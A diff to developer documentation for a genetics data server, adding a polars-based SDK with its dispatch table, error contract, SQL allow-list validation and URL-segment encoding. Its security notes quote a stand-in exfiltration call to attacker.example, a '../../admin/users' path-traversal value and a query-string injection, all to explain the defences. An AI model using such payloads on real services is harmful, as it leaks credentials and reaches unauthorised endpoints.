@@ -260,6 +260,176 @@ Each tool has a `category` field in its definition:
 
 Always-on external servers (gnomAD, Open Targets from `EXTERNAL_MCP_SERVERS`) are included in every profile except `"rag"`. The RAG server (`RAG_MCP_SERVER`) is only included when `tool_profile` is `"rag"` or unset.
 
+## Genetics SDK (`genetics_mcp_server.sdk`)
+
+An importable data-access package sitting **over** `ToolExecutor`, for code that consumes
+genetics data programmatically rather than through a tool schema. It is the data half of the
+code-execution agent: a script in the sandbox imports it instead of the agent calling 42
+API-category tools.
+
+```python
+import genetics_mcp_server.sdk as genetics
+import polars as pl
+
+df = genetics.credible_sets(gene="IL7R")
+df.filter(pl.col("pip") > 0.5).join(genetics.mpra(gene="IL7R"), on="variant")
+```
+
+The MCP and chat tool surfaces are unchanged and still call `ToolExecutor` directly; the SDK
+is an additional entry point, not a replacement.
+
+### The grid collapse
+
+The by-gene / by-variant / by-region / by-phenotype split that produced the near-duplicate
+tool names is an **argument** here, not a function name. `_one_of()` in `sdk/client.py`
+enforces that exactly one selector is supplied and refuses ambiguity rather than picking a
+winner.
+
+| SDK function | Executor methods it dispatches to |
+|---|---|
+| `credible_sets(gene=\|qtl_gene=\|variant=\|region=\|phenotype=[, credible_set_id=, leads_only=])` | `get_credible_sets_by_gene`, `_by_qtl_gene`, `_by_variant`, `_by_region`, `_by_phenotype`, `get_credible_set_by_id`, `get_credible_set_leads_by_phenotype` |
+| `colocalization(variant=\|credible_set_id=+phenotype=)` | `get_colocalization`, `get_colocalization_by_credible_set` |
+| `exome(gene=\|variant=\|region=\|phenotype=)` | `get_exome_results_by_gene`/`_variant`/`_region`/`_phenotype` |
+| `gene_burden(gene=\|phenotype=)` | `get_gene_based_results`, `get_gene_based_results_by_phenotype` |
+| `asm_qtl(variant=\|gene=)` | `get_asm_qtl_by_variant`, `get_asm_qtl_by_gene` |
+| `open_chromatin(variant=\|region=\|peak=\|gene=)` | `get_open_chromatin_by_variant`/`_region`/`_peak`/`_gene` |
+| `peak_to_gene(peak=\|gene=)` | `get_peak_to_genes`, `get_gene_to_peaks` |
+| `variant_effect(variant=\|gene=)` | `get_variant_effect_by_variant`, `_by_gene` |
+| `mpra(variant=\|region=\|gene=)` | `get_mpra_by_variant`/`_region`/`_gene` |
+| `mpra_pip_concordance(gene)` | `get_mpra_pip_concordance_by_gene` |
+| `variant_annotation(variant=\|region=\|gene=\|variants=)` | `get_variant_annotations` (already collapsed) |
+| `gene_annotations(region=\|nearest_to=\|group=)` | `get_genes_in_region`, `get_nearest_genes`, `get_gene_group_members` |
+| `expression(gene)` | `get_gene_expression` |
+| `gene_disease(gene)` | `get_gene_disease_associations` |
+| `summary_stats(phenotypes=, variants=\|region=)` | `get_summary_stats`, `get_summary_stats_by_region` |
+| `ld(variant[, other])` | `get_variants_in_ld`, `get_ld_between_variants` |
+| `search(query=[, kind=]\|rsids=)` | `search_phenotypes`, `search_genes`, `lookup_variants_by_rsid` |
+| `lookup_phenotype_names(codes)` | `lookup_phenotype_names` |
+| `get_dataset_display_names()` | `get_dataset_display_names` |
+| `normalize_gene_symbols(symbols)` | `normalize_gene_symbols` |
+| `sql(query)` | `query_database` |
+| `schema()`, `resources()`, `datasets()` | `get_database_schema`, `get_available_resources`, `list_datasets` |
+
+`mpra_pip_concordance` stays a separate function rather than a keyword on `mpra()`: it is a
+join of `credible_sets_v` and `mpra_v` and returns credible-set columns alongside MPRA
+columns, so the row shape differs from every other `mpra()` result.
+
+Deliberately **not** in the SDK: the external/third-party tools (literature, web search, MGI,
+cBioPortal, myvariant, UniProt), the presentation tools (`create_phewas_plot`,
+`analyze_variant_list`, `get_phenotype_report`, `get_credible_sets_stats`). The first group is
+not genetics-results data; the second is model-facing summarisation that a script writes for
+itself.
+
+`credible_sets`, `summary_stats` and `gene_burden` all return trait **codes** (`I9_CHD`), and
+`search(kind="phenotypes")` is the fuzzy ranked index rather than a lookup, so
+`lookup_phenotype_names` and `get_dataset_display_names` are the code→name resolvers.
+`normalize_gene_symbols` returns **one row per input** with `input`/`symbol`/`resolved`/
+`matched_on`, so the unresolved inputs are rows with a null `symbol`
+(`df.filter(pl.col("symbol").is_null())`) rather than a second list that a DataFrame cannot
+carry — without it a script cannot canonicalise a user-supplied gene list before calling
+`credible_sets(gene=...)`.
+
+### Contract
+
+- **Return type is `polars.DataFrame`** for every row-returning function. Scripts filter and
+  join, which is what a DataFrame is for, polars is already a dependency, and it is already
+  what `executor.py`'s own summarisers use. `schema()`, `resources()` and `datasets()` return
+  dicts because their payloads are nested rather than tabular.
+- **Failures raise `GeneticsError`**; argument-shape mistakes raise `GeneticsUsageError`. The
+  tool layer's `{"success": False, "error": ...}` exists because a model reads the dict; a
+  script author does not check a flag after every call, and an unchecked failure would
+  otherwise read as an empty frame.
+- **No knowledge of HTTP required, and no way to redirect it.** Endpoints come from the
+  environment (`GENETICS_API_URL`, `GENETICS_PUBLIC_API_URL`, `BIGQUERY_API_URL`) and
+  credentials from `INTERNAL_API_SECRET`. Neither `configure()` nor `GeneticsClient()` accepts
+  a URL: the client attaches the internal bearer token to **both** the results-api and the
+  db-api client, so a caller-supplied base URL would be a one-line credential exfiltration
+  (`genetics.configure(api_base_url="http://attacker.example/api"); genetics.expression("APOE")`).
+  `configure()` raises `GeneticsUsageError` on any URL setting. **This is a mitigation, not the
+  answer** — per `genetics-results-suite/docs/code-execution-security.md`, a script that can
+  `import` the SDK can also read `os.environ`, so the sandboxed SDK must eventually carry a
+  short-lived scoped token rather than `INTERNAL_API_SECRET` at all (tasks `.9` / `.14`).
+  `_download_url` / `_download_data` are dropped — a script already holds the rows.
+- **No inline row cap.** `ToolExecutor._row_limit` caps region results at 500 to protect the
+  model's context window; `GeneticsClient` passes `row_limit=None` to the executor **it
+  constructs**. An injected executor is never mutated: it may be the running service's shared
+  one, and lifting its cap in place would flood the model's context at every MCP call site
+  that relies on `_cap_rows`.
+- **Truncation raises rather than returning a prefix.** Silent truncation is the one failure a
+  script cannot detect — the frame is well-formed and merely missing rows, so every downstream
+  count, mean and join is wrong with no signal. `_check_truncation` turns `truncated` /
+  `download_capped_at_100k` into a `GeneticsError`.
+- **Rows are named from the payload's own columns.** results-api returns JSON objects; db-api
+  returns rows **positionally**, with names in a separate `columns` key. Handing positional
+  rows to `pl.from_dicts` does not raise — it transposes them into `column_0`/`column_1` with
+  every value stringified — so `_frame()` switches constructor on whether `columns` is present,
+  and an empty result with `columns` keeps its schema so `.filter(pl.col(...))` still works.
+- **A branch that cannot honour an argument refuses it.** Dropping a filter silently is worse
+  than rejecting it: `exome(gene=..., resources=[...])` that ignores `resources` returns *more*
+  rows than asked for and the frame says nothing. `_reject()` raises `GeneticsUsageError` for
+  `credible_sets(credible_set_id=...)` + a selector, `colocalization(credible_set_id=...)` +
+  `variant`, `exome`/`gene_burden` resource arguments outside their branch, and
+  `gene_annotations`' `n`/`max_distance` (nearest_to only) and `exclude_olfactory` (group only).
+- **Sync by default.** Module-level functions are synchronous wrappers that run the coroutine
+  on a dedicated background event loop (`sdk/_runner.py`), which keeps the HTTP connection pool
+  warm across calls and works from inside an already-running loop. `GeneticsClient` exposes the
+  same functions as awaitables.
+- **Importable standalone.** Nothing under `sdk/` imports the chat backend, the LLM service,
+  the MCP server or the SQLite databases, so the package can be installed into a sandbox image
+  on its own. `test_sdk.py` asserts this in a subprocess.
+
+### SQL safety at the SDK boundary
+
+Five executor methods have no results-api endpoint and build BigQuery SQL themselves
+(`get_asm_qtl_by_gene`, `get_open_chromatin_by_gene`, `get_variant_effect_by_gene`,
+`get_mpra_by_gene`, `get_mpra_pip_concordance_by_gene`). The db-api's `/query` endpoint accepts
+`{sql, max_rows, dry_run}` — **a SQL string with no parameter-binding channel** — so a value
+cannot be bound and must be validated before it is spliced in.
+
+`tools/sql_safety.py` is the single place that happens. It is an allow-list, not escaping:
+`quote_literal()` accepts a value only if every character is in `[A-Za-z0-9_.@:/+-]` (≤128
+chars), which excludes quotes, the backslash escape, the statement separator, whitespace and
+parentheses, so an accepted value cannot terminate the literal it sits in. `normalize_literal()`
+returns the same validated value **unquoted**, for the callers that also reuse it outside SQL
+(the `"gene": gene` echo field, the `filename=f"{gene}_mpra.tsv"` download name that
+`chat_api.py` interpolates into a `Content-Disposition` header) — validation runs on the
+stripped value, so the raw argument can still carry CR/LF the allow-list never saw.
+`sql_int()` and `sql_float()` coerce through `int()`/`float()` with range checks, so a numeric
+slot never receives a string at all, and parenthesise a **negative** token so `g.gstart -
+{token}` cannot render `gstart--5` (a line comment) if the f-string's space ever disappears;
+positive tokens stay bare because BigQuery's `LIMIT` takes a literal, not an expression.
+`_gene_window_cte()` renders the shared gene-span CTE from an already-validated literal.
+
+A rejected value returns the executor's normal `{"success": False, "error": ...}` and the query
+is never issued. This is defence in depth over the db-api's own `authorize_query`, which
+already rejects anything that is not a plain SELECT over the exposed views.
+
+The same five methods gained a `limit` argument (bounded at 100k) so the SDK can raise the
+statement's `LIMIT` without a second code path, and the validated token is coerced back with
+`int()` before it reaches `query_database(max_rows=...)` — `sql_int` accepts `500.0`, and a
+float `max_rows` makes `all_rows[:max_rows]` raise `TypeError` on any result larger than the
+limit, surfacing as the generic internal-error message. `limit` defaults to `MAX_ROWS` in the
+SDK rather than 500: **it is a display bound, not a work or transfer bound.** `query_database`
+calls `_strip_trailing_limit()` and then fetches `max(max_rows, 100_000)`, so the builders'
+trailing `LIMIT` never reaches BigQuery — the join and `ORDER BY` run in full regardless, and a
+low `limit` buys nothing but a positional prefix of an ordered result.
+
+They also take `with_metadata=False`. When set, the returned dict carries the underlying
+query's `columns` and `truncated`, which is how the SDK names the positional rows and detects
+truncation. It is opt-in so the payload these five tools return to the model stays
+byte-identical (bead `genetics-results-suite-bef` covers changing that, and needs sign-off).
+
+### URL path segments
+
+`sql_safety` guards the six SQL slots; the ~59 other caller-controlled values are interpolated
+into **results-api URL paths** on `self.client`, which carries the internal bearer token. httpx
+normalises `..`, so an unencoded segment is not a cosmetic problem: `mpra(variant=
+"../../admin/users")` resolved to `http://api.internal:2000/api/v1/admin/users` with the secret
+attached, and `variant="x?a=b#c"` appended an attacker-controlled query string — defeating the
+typed surface entirely. `executor._seg()` (`quote(value, safe="")`, plus explicit encoding of
+the bare `.`/`..` segments that `quote` leaves alone because `.` is unreserved) now wraps every
+such segment, including the ones passed to `_build_download_url()`.
+
 ## Response Length
 
 The chat API takes a `verbosity` parameter (`"brief"` — the default — or `"detailed"`), surfaced in the web UI as the **Answer** radio group beside the literature-backend and tool-profile selectors. `chat_api.stream_chat` appends the matching fragment from `_VERBOSITY_PROMPTS` (`config/defaults.py`, via `verbosity_prompt()`) to the end of the system prompt.
@@ -546,8 +716,14 @@ src/genetics_mcp_server/
 │   ├── __init__.py
 │   ├── definitions.py   # tool definitions (shared)
 │   ├── executor.py      # tool execution via HTTP
+│   ├── sql_safety.py    # allow-list validation of values spliced into server-built SQL
 │   ├── uniprot.py       # UniProtKB / EBI Proteins API client (TTL cache, accession/symbol resolution)
 │   └── phewas_categories.py  # PheWAS plot category mappings
+├── sdk/                    # importable `genetics` data SDK (thin layer over ToolExecutor)
+│   ├── __init__.py      # sync module-level functions, shared client lifecycle
+│   ├── client.py        # GeneticsClient: one async method per data product
+│   ├── _runner.py       # background event loop backing the sync facade
+│   └── errors.py        # GeneticsError / GeneticsUsageError
 ├── subagent.py             # parallel subagent service
 ├── scripts/
 │   ├── analyze_variants.py # standalone variant list analysis CLI
@@ -583,6 +759,7 @@ src/genetics_mcp_server/
 1. **MCP Server mode**: Client → FastMCP → ToolExecutor → Genetics API
 2. **Chat API mode**: HTTP → FastAPI → LLMService → Anthropic/OpenAI → ToolExecutor → Genetics API
 3. **Subagent mode**: Main Agent → `launch_subagents` tool → SubagentService → parallel Claude API calls → ToolExecutor/External Tools → results aggregated back to main agent
+4. **SDK mode**: script → `genetics_mcp_server.sdk` → GeneticsClient → ToolExecutor → Genetics API / BigQuery. Same executor, different entry point: no tool schema, no context row cap, polars frames instead of result envelopes.
 
 ### Turn termination and truncation
 
@@ -1077,7 +1254,9 @@ Tests are in `tests/` using pytest with pytest-asyncio:
 | `test_subagent.py` | Subagent service, skills, sandbox tools |
 | `test_variant_analysis.py` | Variant list analysis tool |
 | `test_downloads.py` | Download store, TSV conversion, download endpoint |
-| `test_bigquery_gene_tools.py` | BigQuery-backed gene tools |
+| `test_bigquery_gene_tools.py` | BigQuery-backed gene tools, and the injection defence on the five methods that build SQL themselves (injected gene/resource/window rejected before the query is issued, legitimate symbols quoted, `limit` honoured by both the statement and the row cap) |
+| `test_sql_safety.py` | Allow-list SQL literal validation: real gene/resource ids accepted, quote/backslash/semicolon/newline/NUL payloads rejected, numeric coercion and range checks |
+| `test_sdk.py` | Genetics SDK: argument-shape dispatch for every collapsed function (gene vs variant vs region vs phenotype), refusal of ambiguous or empty shapes and of arguments the selected branch cannot honour, region parsing, DataFrame return contract (positional db-api rows named from `columns`, empty results keeping their schema), `GeneticsError` on failure and on truncation, `limit` defaulting to the row ceiling, the row cap being lifted only on executors the client builds, `configure()` refusing to redirect the authenticated client, phenotype/dataset/gene-symbol lookups, the sync facade, and a subprocess check that importing the SDK pulls in no chat-backend module |
 | `test_gene_group_tools.py` | Gene group membership and symbol normalization |
 | `test_literature_search.py` | Literature backend selection, Perplexity metadata hydration |
 | `test_myvariant.py` | myvariant.info annotation tool |
